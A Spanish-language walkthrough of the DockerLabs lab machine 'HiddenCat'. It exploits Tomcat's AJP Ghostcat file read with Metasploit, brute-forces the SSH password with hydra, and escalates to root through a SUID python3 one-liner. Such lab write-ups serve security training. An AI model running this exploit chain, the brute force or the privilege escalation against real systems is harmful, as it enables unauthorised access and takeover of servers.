# HiddenCat
https://dockerlabs.es

*27/5/2024*

## ENUMERACION

```
└─$ nmap -p- --open --min-rate 5000 -sCV 172.17.0.2                                     
Nmap scan report for 172.17.0.2
Host is up (0.00028s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u4 (protocol 2.0)
| ssh-hostkey: 
|   2048 4d:8d:56:7f:47:95:da:d9:a4:bb:bc:3e:f1:56:93:d5 (RSA)
|   256 8d:82:e6:7d:fb:1c:08:89:06:11:5b:fd:a8:08:1e:72 (ECDSA)
|_  256 1e:eb:63:bd:b9:87:72:43:49:6c:76:e1:45:69:ca:75 (ED25519)
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http    Apache Tomcat 9.0.30
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat/9.0.30
|_http-favicon: Apache Tomcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

## ANALISIS DE VULNERABILIDADES

```
└─$ searchsploit ajp  
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
Apache Tomcat - AJP 'Ghostcat File Read/Inclusion                                 | multiple/webapps/48143.py
Apache Tomcat - AJP 'Ghostcat' File Read/Inclusion (Metasploit)                   | multiple/webapps/49039.rb
---------------------------------------------------------------------------------- ---------------------------------
```

## EXPLOTACION

![image](https://github.com/M1queaa/DOCKERLABS/assets/108646257/8c9ee9e4-2a57-47ac-a035-6bc2d97a5f3a)

```
msf6 auxiliary(admin/http/tomcat_ghostcat) > run
[*] Running module against 172.17.0.2                                                                               
<?xml version="1.0" encoding="UTF-8"?>                                                                              
<!--                                                                                                                
 Licensed to the Apache Software Foundation (ASF) under one or more                                                 
  contributor license agreements.  See the NOTICE file distributed with                                             
  this work for additional information regarding copyright ownership.                                               
  The ASF licenses this file to You under the Apache License, Version 2.0                                           
  (the "License"); you may not use this file except in compliance with                                              
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
  version="4.0"
  metadata-complete="true">

  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to Tomcat, Jerry ;)
  </description>

</web-app>
```

Encontramos el usuario Jerry, el cual podremos utilizar para hacer un ataque de fuerza bruta mediante el puerto SSH

```
└─$ hydra -l jerry -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: jerry   password: chocolate

```

Con esta password los entramos al servicio ssh

```
└─$ ssh jerry@172.17.0.2                                       
jerry@172.17.0.2's password: chocolate

jerry@4f78df3f2cf0:~$ whoami
jerry

```


## POST-EXPLOTACION


```
jerry@4f78df3f2cf0:~$ sudo -l
-bash: sudo: command not found
jerry@4f78df3f2cf0:/$ find / -perm -4000 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper                                                                         
/usr/lib/openssh/ssh-keysign                                                                                        
/usr/bin/chsh                                                                                                       
/usr/bin/perl                                                                                                       
/usr/bin/passwd                                                                                                     
/usr/bin/perl5.28.1
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/python3.7m
/usr/bin/python3.7
/bin/su
/bin/mount
/bin/ping
/bin/umount
```

Escalamos privilegios como usuario root
```
jerry@4f78df3f2cf0:/usr/bin$ ./python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
# whoami
root
```


